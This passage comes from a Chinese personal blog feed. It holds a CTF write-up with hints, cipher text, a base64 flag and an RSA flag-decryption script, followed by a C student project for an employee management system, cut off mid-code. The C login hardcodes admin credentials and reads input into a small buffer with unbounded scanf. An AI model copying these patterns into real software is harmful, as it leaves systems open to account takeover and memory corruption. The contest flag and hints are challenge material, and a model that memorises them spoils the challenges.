id="4-EasyPcap"><a href="#4-EasyPcap" class="headerlink" title="4. EasyPcap"></a>4. EasyPcap</h3><p>这道题算是最简单的流量分析题目，里面只有HTML和tcp两个流，依次追踪一遍就能知道答案。</p><h3 id="5-曲阜师范大学"><a href="#5-曲阜师范大学" class="headerlink" title="5. 曲阜师范大学"></a>5. 曲阜师范大学</h3><p>他已经给出了提示，感觉里面全是文字，我们可以用winhex看看这个题，这里需要用到第一题常用文件头的知识。然后还需要一个formost工具，工具已经提供了。后续还有一步密码破解，试试究竟是找出密码还是怎么做吧？</p><h2 id="（二）web"><a href="#（二）web" class="headerlink" title="（二）web"></a>（二）web</h2><p>关于web在这里我其实想吐槽一句，这个真是是给21级新生做的吗？居然考了sql注入和php反序列化。</p><h3 id="1-Easy-Web"><a href="#1-Easy-Web" class="headerlink" title="1.Easy_Web"></a>1.Easy_Web</h3><p>如题easy web，很多靶场都会有这一种类型的题目，是最经典的送分题。</p><h3 id="2-Findit"><a href="#2-Findit" class="headerlink" title="2.Findit"></a>2.Findit</h3><p>这一道题，较上一道题难度有所提升，flag被分成了两块，试着找出来吧（说实话我一开始以为那部分缺的一半是自己猜的呢），注意在找到前半部分的flag之后不要尝试去补全句子，这样是得不到flag的。</p><h2 id="（三）Crypto"><a href="#（三）Crypto" class="headerlink" title="（三）Crypto"></a>（三）Crypto</h2><h3 id="1-签到-1"><a href="#1-签到-1" class="headerlink" title="1. 签到"></a>1. 签到</h3><p>这道题实际上就是base64，关于base系列的密码有一整个系列，如base32，base64，base96等。</p><blockquote><p>cWZudXtodWFuX3lpbmdfbGFpX2Rhb19xdV95dWFuX2RhX2ppYV90aW5nfQ==</p></blockquote><h3 id="2-栅栏密码"><a href="#2-栅栏密码" class="headerlink" title="2.栅栏密码"></a>2.栅栏密码</h3><p>这个真就是栅栏密码，这两个题都属于是古典密码，类似的还有很多，这类密码最重要的</p><blockquote><p>qn{nls_ss_a}fuegihi_onn</p></blockquote><h3 id="3-emoji密码"><a href="#3-emoji密码" class="headerlink" title="3. emoji密码"></a>3. emoji密码</h3><p>一个用颜表情做的密码，这个密码在之前我也没见过，这种就是考察查找利用知识对能力和快速学习的能力。</p><h3 id="4-BrainFUCK"><a href="#4-BrainFUCK" class="headerlink" title="4. BrainFUCK"></a>4. BrainFUCK</h3><p>BrainFUCK正好是一种密码的方式，不过这道题更多了一些小心思。</p><h3 id="5-RSA"><a href="#5-RSA" class="headerlink" title="5.RSA"></a>5.RSA</h3><p>这道题也是我硕抱怨的另一个点，这道题是RSA加密算法，解决的话需要会编写脚本的能力，和对RSA密码的了解，在这里提供一个<a href="http://ctf.ssleye.com/pub_asys.html">公钥分析</a>的网址，通过这里可以提取n和e，</p><blockquote><p> cmd 进入 yafu 的解压目录，输入 yafu-x64<br>factor(需要分解的大数)<br>遇到因数位数过长：新建文件 p.txt，内容写上 n 的值，最后面要换行<br>yafu-x64 “factor(@)” -batchfile p.txt </p></blockquote><p>这是题库wp里提供的解题思路，不过这一道题完全可以使用在线的解题工具分解n得到指数p和q，这是<a href="http://factordb.com/">解题工具</a>。在通过编写脚本完成解题。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> hashlib<span class="token keyword">import</span> base64<span class="token keyword">import</span> gmpy2<span class="token keyword">import</span> rsap <span class="token operator">=</span> <span class="token number">55801219744752013328353829126338788731389</span>q <span class="token operator">=</span> <span class="token number">1306404104626383868633664968881427933</span>e <span class="token operator">=</span> <span class="token number">65537</span>n <span class="token operator">=</span> <span class="token number">72898942517702846572619158917269560125985151716076557250750365689783898488937</span>d <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>key <span class="token operator">=</span> rsa<span class="token punctuation">.</span>PrivateKey<span class="token punctuation">(</span>n<span class="token punctuation">,</span>e<span class="token punctuation">,</span>d<span class="token punctuation">,</span>p<span class="token punctuation">,</span>q<span class="token punctuation">)</span><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"flag.enc"</span><span class="token punctuation">,</span><span class="token string">"r"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>    f <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>a<span class="token operator">=</span>base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>f<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>rsa<span class="token punctuation">.</span>decrypt<span class="token punctuation">(</span>a<span class="token punctuation">,</span>key<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>(四)Reverse</p><p>reverse的题目至少第一二道很简单，都可以看看，这里就不写解题过程了。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 解题记录 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C语言课程实训：员工信息管理系统</title>
      <link href="/2021/07/31/C%E8%AF%AD%E8%A8%80%E5%AE%9E%E8%AE%AD%E4%B9%8B%E5%91%98%E5%B7%A5%E4%BF%A1%E6%81%AF%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/"/>
      <url>/2021/07/31/C%E8%AF%AD%E8%A8%80%E5%AE%9E%E8%AE%AD%E4%B9%8B%E5%91%98%E5%B7%A5%E4%BF%A1%E6%81%AF%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/</url>
      
        <content type="html"><![CDATA[<h2 id="1-需求分析"><a href="#1-需求分析" class="headerlink" title="1.需求分析"></a>1.需求分析</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;一家公司不仅应该有管理者，还应该有数量更多的普通员工，一个员工信息管理系统，不仅要有管理员操作的模块还要有员工模块。</p><h4 id="1-1员工登录"><a href="#1-1员工登录" class="headerlink" title="1.1员工登录"></a>1.1员工登录</h4><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这一部分需要实现员工自主查询信息的功能，但要求不能使员工更改数据库中的信息</p><h4 id="1-2管理员登录"><a href="#1-2管理员登录" class="headerlink" title="1.2管理员登录"></a>1.2管理员登录</h4><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这一部分要实现管理员对员工信息的管理，包括：新建员工信息、浏览员工信息、以员工号或姓名的方式查询员工信息、删除员工信息、根据各种方式筛选相应员工、修改员工信息以及退出该管理服务系统等等。每一步都将相应的数据存入二进制文件中。</p><h2 id="2-系统设计"><a href="#2-系统设计" class="headerlink" title="2.系统设计"></a>2.系统设计</h2><h3 id="nbsp-nbsp-nbsp-2-1实现员工登陆查询信息系统"><a href="#nbsp-nbsp-nbsp-2-1实现员工登陆查询信息系统" class="headerlink" title="&nbsp;&nbsp;&nbsp;2.1实现员工登陆查询信息系统"></a>&nbsp;&nbsp;&nbsp;2.1实现员工登陆查询信息系统</h3><h3 id="nbsp-nbsp-nbsp-2-2实现管理员登录管理系统"><a href="#nbsp-nbsp-nbsp-2-2实现管理员登录管理系统" class="headerlink" title="&nbsp;&nbsp;&nbsp;2.2实现管理员登录管理系统"></a>&nbsp;&nbsp;&nbsp;2.2实现管理员登录管理系统</h3><h5 id="nbsp-nbsp-nbsp-nbsp-nbsp-nbsp-nbsp-nbsp-nbsp-nbsp-模块一：实现新建职工信息功能；"><a href="#nbsp-nbsp-nbsp-nbsp-nbsp-nbsp-nbsp-nbsp-nbsp-nbsp-模块一：实现新建职工信息功能；" class="headerlink" title="&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;模块一：实现新建职工信息功能；"></a>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;模块一：实现新建职工信息功能；</h5><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;以追加的形式将数据存入二进制文件，并且将从文本文件中读取的num值自增，并将num重新存入文本文件中。</p><h5 id="nbsp-nbsp-nbsp-nbsp-nbsp-nbsp-nbsp-nbsp-nbsp-nbsp-模块二：实现浏览员工信息功能；"><a href="#nbsp-nbsp-nbsp-nbsp-nbsp-nbsp-nbsp-nbsp-nbsp-nbsp-模块二：实现浏览员工信息功能；" class="headerlink" title="&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;模块二：实现浏览员工信息功能；"></a>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;模块二：实现浏览员工信息功能；</h5><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;一开始计划是只是浏览全部的员工信息，在后期的制作中，想到一个公司往往会有各种活动，需要对参与员工进行筛选，对其追加了根据年龄，工资性别的筛选功能。</p><h5 id="nbsp-nbsp-nbsp-nbsp-nbsp-nbsp-nbsp-nbsp-nbsp-nbsp-nbsp-模块三：实现查询员工信息功能；"><a href="#nbsp-nbsp-nbsp-nbsp-nbsp-nbsp-nbsp-nbsp-nbsp-nbsp-nbsp-模块三：实现查询员工信息功能；" class="headerlink" title="&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;模块三：实现查询员工信息功能；"></a>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;模块三：实现查询员工信息功能；</h5><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;对员工信息的查询功能包括两个方面，按员工号进行查询和按照姓名方式进行查询如果查询失败则输出没有该员工，返回操作页面。</p><h5 id="模块四：实现删除员工信息功能；"><a href="#模块四：实现删除员工信息功能；" class="headerlink" title="模块四：实现删除员工信息功能；"></a>模块四：实现删除员工信息功能；</h5><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;从二进制文件中将数据全部读取出来，将输入的员工号与已有数据中的员工号进行比对，当数据相同时删除该员工信息，并将全部信息重新写入文件中。</p><h4 id="nbsp-nbsp-nbsp-nbsp-nbsp-模块五：实现修改员工信息功能；"><a href="#nbsp-nbsp-nbsp-nbsp-nbsp-模块五：实现修改员工信息功能；" class="headerlink" title="&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;模块五：实现修改员工信息功能；"></a>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;模块五：实现修改员工信息功能；</h4><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;该模块具体执行数据的修改，分成八个部分修改员工的各种信息。</p><h4 id="nbsp-nbsp-nbsp-nbsp-nbsp-模块六：实现退出服务系统功能；"><a href="#nbsp-nbsp-nbsp-nbsp-nbsp-模块六：实现退出服务系统功能；" class="headerlink" title="&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;模块六：实现退出服务系统功能；"></a>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;模块六：实现退出服务系统功能；</h4><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;用于结束程序的模块</p><h4 id="nbsp-nbsp-nbsp-nbsp-nbsp-模块七：实现读取已存入数据个数"><a href="#nbsp-nbsp-nbsp-nbsp-nbsp-模块七：实现读取已存入数据个数" class="headerlink" title="&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;模块七：实现读取已存入数据个数"></a>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;模块七：实现读取已存入数据个数</h4><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;由于使用了一个文本文件进行辅助工作，这个程序这是读取txt格式文本文件中存储的数字，将他存入全局变量num中。</p><h4 id="nbsp-nbsp-nbsp-nbsp-nbsp-模块八：管理员登录后的操作页面；"><a href="#nbsp-nbsp-nbsp-nbsp-nbsp-模块八：管理员登录后的操作页面；" class="headerlink" title="&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;模块八：管理员登录后的操作页面；"></a>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;模块八：管理员登录后的操作页面；</h4><h2 id="3-详细代码"><a href="#3-详细代码" class="headerlink" title="3.详细代码"></a>3.详细代码</h2><h4 id="nbsp-nbsp-nbsp-3-1-1company-h"><a href="#nbsp-nbsp-nbsp-3-1-1company-h" class="headerlink" title="&nbsp;&nbsp;&nbsp;3.1.1company.h"></a>&nbsp;&nbsp;&nbsp;3.1.1company.h</h4><pre class="line-numbers language-none"><code class="language-none">#include&lt;stdio.h&gt;#include&lt;string.h&gt;#include&lt;math.h&gt;#include&lt;stdlib.h&gt;#include &lt;ctype.h&gt;#include&lt;windows.h&gt;#include&lt;conio.h&gt;static int NUM;struct workers&#123;        char jobNo[20];       &#x2F;&#x2F;工号        char name[15];        &#x2F;&#x2F;姓名        char sex[15];         &#x2F;&#x2F;性别        char year[15];        &#x2F;&#x2F;年龄        char position[15];    &#x2F;&#x2F;职务        char salary[15];      &#x2F;&#x2F;工资        char addr[15];        &#x2F;&#x2F;住址        char tel[15];         &#x2F;&#x2F;电话&#125;;void f_1(struct workers *workers);void f_2(struct workers *workers);void f_3(struct workers *n);void f_3_2(struct workers *workers);void f_3_1(struct workers *workers);int  f_4(struct workers *workers);void f_5(struct workers *workers);int f_6(char n);void see (void);void xtjz(void);int sign(void);int Hollow(void);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="nbsp-nbsp-nbsp-3-1-2company-c"><a href="#nbsp-nbsp-nbsp-3-1-2company-c" class="headerlink" title="&nbsp;&nbsp;&nbsp;3.1.2company.c"></a>&nbsp;&nbsp;&nbsp;3.1.2company.c</h4><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;string.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;math.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdlib.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;ctype.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;windows.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">"gongshi.h"</span></span><span class="token keyword">void</span> <span class="token function">smile</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">//1、系统加载界面</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> i<span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n\n\n\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\t\t\t\t\t系统加载中\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\t\t\t"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span><span class="token number">20</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"$ "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>i <span class="token operator">==</span><span class="token number">19</span><span class="token punctuation">)</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">Sleep</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//使计算机进入短暂的休眠状态100毫秒</span>    <span class="token punctuation">&#125;</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"cls"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n\n\n\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\t\t\t\t\t系统加载完成！\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\t\t\t\t\t  欢迎使用！\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">Sleep</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"cls"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//执行清屏操作</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">sign</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> n<span class="token punctuation">;</span>    <span class="token keyword">struct</span> <span class="token class-name">workers</span> <span class="token operator">*</span>workers<span class="token punctuation">;</span>    workers <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">workers</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">workers</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\t\t\t=============================================================\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\t\t\t||                  《职工信息管理系统》                   ||\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\t\t\t||                                                         ||\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\t\t\t||                 请按相应按键使用本系统！                ||\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\t\t\t||                                                         ||\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\t\t\t||                                                         ||\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\t\t\t||   1.员工登录                       2.管理员模式         ||\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\t\t\t||                                                         ||\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\t\t\t=============================================================\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>n<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> number<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> pow<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>n<span class="token operator">==</span><span class="token number">2</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"请输入管理员账号"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span>number<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">fflush</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"请输入密码"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span><span class="token number">9</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>            <span class="token punctuation">&#123;</span>                pow<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">getch</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token comment">/*逐次赋值,但不回显*/</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>pow<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'\x0d'</span><span class="token punctuation">)</span>                    <span class="token comment">/*回车则终止循环*/</span>                <span class="token punctuation">&#123;</span>                    pow<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">'\0'</span><span class="token punctuation">;</span>                    <span class="token keyword">break</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>                <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"*"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token comment">/*以星号代替字符个数*/</span>            <span class="token punctuation">&#125;</span>            <span class="token function">fflush</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">strcmp</span><span class="token punctuation">(</span>number<span class="token punctuation">,</span><span class="token string">"0001"</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token function">strcmp</span><span class="token punctuation">(</span>pow<span class="token punctuation">,</span><span class="token string">"123456"</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token punctuation">&#123;</span>                <span class="token keyword">return</span> n<span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">else</span>                <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"账号或密码错误!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>n<span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token function">f_3</span> <span class="token punctuation">(</span>workers<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> n<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">int</span> n<span class="token punctuation">;</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"cls"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"请输入正确的功能编号!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"pause"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"cls"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">sign</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">see</span> <span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token comment">//该函数是从辅助文件中读取员工个数；</span><span class="token punctuation">&#123;</span>    FILE <span class="token operator">*</span>fp1<span class="token punctuation">;</span>    <span class="token keyword">char</span> ch<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    fp1<span class="token operator">=</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"data.txt"</span><span class="token punctuation">,</span><span class="token string">"r+"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//data.txt为辅助的文本文件；</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>fp1<span class="token operator">==</span><span class="token constant">NULL</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"人数预存文件打开失败"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">exit</span><span class="token punctuation">(</span>EXIT_FAILURE<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">fgets</span><span class="token punctuation">(</span>ch<span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span>fp1<span class="token punctuation">)</span><span class="token punctuation">;</span>    NUM<span class="token operator">=</span><span class="token function">atoi</span><span class="token punctuation">(</span>ch<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">fclose</span><span class="token punctuation">(</span>fp1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">Hollow</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token comment">//管理员页面，在程序中会反复调用；</span><span class="token punctuation">&#123;</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"cls"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n\n\n\t\t\t=============================================================\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\t\t\t||                                                         ||\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\t\t\t||                   《职工信息管理系统》                  ||\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\t\t\t||                                                         ||\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\t\t\t||                       管理员页面！                      ||\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\t\t\t||                                                         ||\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\t\t\t||                                                         ||\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\t\t\t||                                                         ||\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\t\t\t||                                                         ||\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\t\t\t||   1.新建职工信息                 2.浏览职工信息         ||\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\t\t\t||                                                         ||\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\t\t\t||   3.查询职工信息                 4.删除职工信息         ||\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\t\t\t||                                                         ||\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\t\t\t||   5.变更职工信息                 6.退出程序             ||\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\t\t\t||                                                         ||\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\t\t\t=============================================================\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">f_6</span><span class="token punctuation">(</span><span class="token keyword">char</span> n<span class="token punctuation">)</span><span class="token comment">//退出程序；</span><span class="token punctuation">&#123;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token 